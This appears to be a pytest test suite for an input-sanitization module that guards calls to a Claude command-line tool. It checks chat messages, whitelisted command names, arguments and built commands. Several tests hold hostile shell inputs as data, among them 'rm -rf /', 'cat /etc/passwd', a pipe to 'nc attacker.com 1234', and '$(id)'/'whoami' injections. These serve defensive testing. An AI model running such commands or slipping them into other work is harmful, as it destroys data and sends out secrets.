"""Tests for input sanitization."""

import pytest

from app.security.sanitize import (
    SanitizationError,
    build_safe_claude_command,
    build_safe_slash_command,
    sanitize_chat_message,
    sanitize_command_args,
    sanitize_command_name,
)


class TestSanitizeChatMessage:
    """Tests for chat message sanitization."""

    def test_valid_message(self):
        """Valid message should pass through."""
        message = "Hello, how can you help me?"
        result = sanitize_chat_message(message)
        assert result == message

    def test_empty_message_raises(self):
        """Empty message should raise error."""
        with pytest.raises(SanitizationError) as exc_info:
            sanitize_chat_message("")
        assert exc_info.value.field == "message"

    def test_message_too_long_raises(self):
        """Message exceeding max length should raise error."""
        long_message = "x" * 50000
        with pytest.raises(SanitizationError) as exc_info:
            sanitize_chat_message(long_message)
        assert "maximum length" in exc_info.value.message

    def test_shell_metacharacters_rejected(self):
        """Shell metacharacters should be rejected."""
        dangerous_messages = [
            "hello; rm -rf /",
            "hello && cat /etc/passwd",
            "hello | nc attacker.com 1234",
            "hello `whoami`",
            "hello $(id)",
        ]
        for message in dangerous_messages:
            with pytest.raises(SanitizationError):
                sanitize_chat_message(message)

    def test_null_bytes_rejected(self):
        """Null bytes should be rejected."""
        with pytest.raises(SanitizationError) as exc_info:
            sanitize_chat_message("hello\x00world")
        # Null bytes are caught as dangerous characters
        assert (
            "dangerous characters" in exc_info.value.message
            or "null bytes" in exc_info.value.message
        )

    def test_newlines_allowed(self):
        """Newlines should be allowed in messages."""
        message = "Line 1\nLine 2\nLine 3"
        result = sanitize_chat_message(message)
        assert result == message

    def test_unicode_allowed(self):
        """Unicode characters should be allowed."""
        message = "Hello 你好 مرحبا 🎉"
        result = sanitize_chat_message(message)
        assert result == message


class TestSanitizeCommandName:
    """Tests for command name sanitization."""

    def test_valid_command(self):
        """Valid command names should pass."""
        assert sanitize_command_name("help") == "help"
        assert sanitize_command_name("status") == "status"
        assert sanitize_command_name("plan-feature") == "plan-feature"

    def test_leading_slash_removed(self):
        """Leading slash should be removed."""
        assert sanitize_command_name("/help") == "help"
        assert sanitize_command_name("//help") == "help"

    def test_empty_command_rejected(self):
        """Empty command should be rejected."""
        with pytest.raises(SanitizationError):
            sanitize_command_name("")

    def test_invalid_characters_rejected(self):
        """Commands with invalid characters should be rejected."""
        invalid_commands = [
            "help; rm",
            "status && id",
            "plan$(whoami)",
            "test.command",
            "test command",
        ]
        for cmd in invalid_commands:
            with pytest.raises(SanitizationError):
                sanitize_command_name(cmd)

    def test_unlisted_command_rejected(self):
        """Commands not in whitelist should be rejected."""
        with pytest.raises(SanitizationError) as exc_info:
            sanitize_command_name("dangerous-command")
        assert "not in the allowed commands list" in exc_info.value.message


class TestSanitizeCommandArgs:
    """Tests for command arguments sanitization."""

    def test_valid_args(self):
        """Valid arguments should pass through."""
        args = ["--project", "my-project", "--verbose"]
        result = sanitize_command_args(args)
        assert result == args

    def test_empty_args_returns_empty(self):
        """Empty args list should return empty list."""
        assert sanitize_command_args([]) == []

    def test_none_args_returns_empty(self):
        """None args should return empty list."""
        assert sanitize_command_args(None) == []

    def test_shell_metacharacters_rejected(self):
        """Arguments with shell metacharacters should be rejected."""
        with pytest.raises(SanitizationError):
            sanitize_command_args(["--project", "test; rm -rf /"])

    def test_null_bytes_rejected(self):
        """Arguments with null bytes should be rejected."""
        with pytest.raises(SanitizationError):
            sanitize_command_args(["--project", "test\x00project"])


class TestBuildSafeClaudeCommand:
    """Tests for building safe Claude commands."""

    def test_basic_command(self):
        """Basic command should be built correctly."""
        cmd = build_safe_claude_command("Hello world")
        assert cmd == ["claude", "-p", "Hello world", "--output-format", "text"]

    def test_json_output_format(self):
        """JSON output format should be set correctly."""
        cmd = build_safe_claude_command("Hello", output_format="json")
        assert "--output-format" in cmd
        assert "json" in cmd

    def test_stream_json_output_format(self):
        """Stream-JSON output format should be set correctly."""
        cmd = build_safe_claude_command("Hello", output_format="stream-json")
        assert "stream-json" in cmd

    def test_invalid_output_format_rejected(self):
        """Invalid output format should be rejected."""
        with pytest.raises(SanitizationError) as exc_info:
            build_safe_claude_command("Hello", output_format="xml")
        assert "output_format" in exc_info.value.field

    def test_extra_args_included(self):
        """Extra args should be included."""
        cmd = build_safe_claude_command("Hello", extra_args=["--max-turns", "5"])
        assert "--max-turns" in cmd
        assert "5" in cmd


class TestBuildSafeSlashCommand:
    """Tests for building safe slash commands."""

    def test_basic_slash_command(self):
        """Basic slash command should be built correctly."""
        cmd = build_safe_slash_command("help")
        assert "/help" in " ".join(cmd)

    def test_slash_command_with_args(self):
        """Slash command with args should be built correctly."""
        cmd = build_safe_slash_command("orchestrate", args=["--project", "test"])
        prompt = cmd[2]  # The prompt is the third argument after "claude -p"
        assert "/orchestrate" in prompt
        assert "--project" in prompt
        assert "test" in prompt

    def test_invalid_command_rejected(self):
        """Invalid slash command should be rejected."""
        with pytest.raises(SanitizationError):
            build_safe_slash_command("dangerous-unknown-command")
